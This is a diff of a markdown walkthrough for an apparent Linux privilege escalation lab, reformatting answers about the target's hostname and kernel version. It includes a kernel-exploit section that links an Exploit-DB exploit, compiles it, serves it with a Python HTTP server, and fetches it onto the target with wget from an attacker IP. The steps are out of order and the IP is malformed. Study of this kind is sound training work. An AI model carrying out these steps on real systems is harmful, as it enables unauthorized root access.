@@ -330,19 +330,20 @@ As we are in the Linux realm, familiarity with Linux commands, in general, will 
 ---
 
 1. What is the hostname of the target system?
-wade7363
+
+   Answer: wade7363
 
 ```
 hostname
 ```
 
 2. What is the Linux kernel version of the target system? 
-3.13.0-24-generic
+
+   Answer: 3.13.0-24-generic
+
 ```
 uname -a
-
 or 
-
 cat /proc/version
 ```
 
@@ -351,16 +352,19 @@ Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86
 nux
 ```
 
-3. What Linux is this? Ubuntu 14.04 LTS
- 
- cat /etc/issue 
+3. What Linux is this? 
+
+   Answer: Ubuntu 14.04 LTS
+
 ```
- cd etc
- cat issue
+cat /etc/issue 
 ```
 
+
+
 4. What version of the Python language is installed on the system? 
-2.7.6
+
+   Answer: 2.7.6
 
 ```
 python --version or python -V
@@ -396,7 +400,9 @@ The target system’s environment will influence the tool you will be able to us
 
 - [Linux Priv Checker](https://github.com/linted/linuxprivchecker)
 
+
 ---
+
 
 Task 5 Privilege Escalation: Kernel Exploits
 ---
@@ -421,7 +427,7 @@ Although it looks simple, please remember that a failed kernel exploit can lead 
 
 
 ### Research sources:
-
+---
 1. Based on your findings, you can use Google to search for an existing exploit code.
 
 2. Sources such as https://www.linuxkernelcves.com/cves can also be useful.
@@ -445,20 +451,26 @@ Step 1: Search the exploit code
 - Link: https://www.exploit-db.com/download/37292
 
 Step 2: download the code the attack machine
+
 ```
 gcc 37292.c -o ofc
 wget  https://www.exploit-db.com/download/37292
 ```
+
 Step 3: using python3 http.server cmd
+
 Ref: https://unix.stackexchange.com/questions/32182/simple-command-line-http-server
+
 ```
 python3 -m http.server
 ```
 
 Step 4: on the Target machine download the exploit file, 37292.c
+
 ```
 wget https://10.10198.10:8000/ofc
 ```
+
 Step 5: 
 
 Note:  
@@ -482,10 +494,12 @@ cat flag1.txt
 ```
 
 Kill python http server
+
 ```
 MYPORT=8888; 
 kill -9 `ps -ef |grep SimpleHTTPServer |grep $MYPORT |awk '{print $2}'`
 ```
+
 Explain command line :
 - ```ps -ef```  : list all process.
 
@@ -496,6 +510,8 @@ Explain command line :
 - ```awk '{print $2}'``` : print second column of result which is the PID (Process ID)
 
 - ```kill -9 <PID> ```: Force Kill process with the appropriate PID.
+
+---
 
 
 Task 6 Privilege Escalation: Sudo
